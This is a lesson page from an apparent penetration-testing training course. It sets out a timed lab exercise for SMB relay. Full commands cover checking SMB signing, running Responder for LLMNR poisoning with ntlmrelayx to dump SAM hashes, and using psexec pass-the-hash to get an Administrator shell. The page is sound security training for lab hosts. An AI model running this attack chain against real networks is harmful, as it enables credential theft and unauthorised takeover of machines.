---
title: "Infrastructure Practice Day 2 — SMB Relay Sprint"
tags: [practice, SMB-relay, LLMNR, Responder, ntlmrelayx, NTLMv2, SAM-dump,
       Windows, T1557.001, ATT&CK]
module: 04-BroadSurface-04
day: 246
related_topics:
  - SMB Relay and LLMNR Poisoning (Day 232)
  - Infrastructure Practice Day 1 (Day 245)
  - Windows PrivEsc Enumeration (Day 238)
---

# Day 246 — Infrastructure Practice Day 2: SMB Relay Sprint

> "Hash cracking is guesswork. Relay is certainty. A complex password is
> uncrackable with rockyou.txt. But if you can relay that same authentication
> to another host, complexity is irrelevant. Today you practice the relay path."
>
> — Ghost

---

## Goals

By the end of today's session you will have:

1. Verified SMB signing status on lab targets.
2. Run Responder and ntlmrelayx simultaneously without conflicts.
3. Relayed captured NTLM authentication to a second host.
4. Extracted SAM hashes from the relay target.
5. Used the extracted NT hash for pass-the-hash authentication.

**Time budget:** 5 hours.

---

## Prerequisites

| Requirement | Reference |
|---|---|
| LLMNR poisoning mechanics | Day 232 |
| ntlmrelayx setup and flags | Day 232 |
| SMB signing concepts | Day 232 |

---

## Phase 1 — SMB Signing Enumeration (Target: < 10 min)

```bash
# Enumerate SMB signing on all lab hosts
nmap -p 445 --script smb2-security-mode 192.168.100.0/24

# Target: identify at least one host with signing NOT required
# Record which hosts are vulnerable to relay:
```

```
[ ] nmap scan completed
[ ] SMB signing status documented for all hosts
[ ] Relay-vulnerable targets identified: ___
```

---

## Phase 2 — Dual Tool Setup (Target: < 10 min)

```bash
# Step 1: Disable Responder's SMB and HTTP servers
sed -i 's/^SMB = On/SMB = Off/' /etc/responder/Responder.conf
sed -i 's/^HTTP = On/HTTP = Off/' /etc/responder/Responder.conf

# Step 2: Start Responder (poisoning only)
responder -I eth0 -v &

# Step 3: Start ntlmrelayx
echo "192.168.100.20" > /tmp/targets.txt
ntlmrelayx.py -tf /tmp/targets.txt -smb2support -i &
```

```
[ ] Responder running with SMB/HTTP disabled
[ ] ntlmrelayx running targeting relay-vulnerable hosts
[ ] No conflict between tools (both listening on different ports)
```

---

## Phase 3 — Trigger and Capture (Target: < 15 min)

```bash
# Trigger LLMNR query from victim-b
docker exec smb-victim-b bash -c \
  "smbclient //nonexistent-fileserver/share -U user1%anything 2>&1 || true"

# Watch ntlmrelayx output for successful relay
```

```
[ ] LLMNR query triggered
[ ] ntlmrelayx captured and relayed authentication
[ ] SAM hashes dumped from target host
[ ] Hashes recorded: Administrator:500:...:NThash
```

---

## Phase 4 — Pass the Hash (Target: < 10 min)

```bash
# Use the extracted NT hash for authentication
NT_HASH="<extracted-nt-hash>"
TARGET="192.168.100.10"

psexec.py -hashes aad3b435b51404eeaad3b435b51404ee:${NT_HASH} \
  Administrator@${TARGET}
```

```
[ ] psexec.py executed with NT hash
[ ] Shell obtained on target host
[ ] whoami confirms: Administrator
[ ] SAM from second target dumped
```

---

## Session Record

| Phase | Target Time | Actual Time |
|---|---|---|
| SMB signing enumeration | < 10 min | ___ |
| Dual tool setup | < 10 min | ___ |
| Trigger + relay | < 15 min | ___ |
| PtH authentication | < 10 min | ___ |
| **Total** | < 45 min | ___ |

**What was the main obstacle?** ___  
**Could you execute Phase 2 (dual tool setup) from memory without notes?** ___

---

## Questions

> Add your questions here. Each question gets a Global ID (Q246.1, Q246.2 …).

---

## Navigation

← Previous: [Day 245 — Infrastructure Practice Day 1](DAY-0245-Infrastructure-Practice-Day-1.md)
→ Next: [Day 247 — Infrastructure Practice Day 3](DAY-0247-Infrastructure-Practice-Day-3.md)
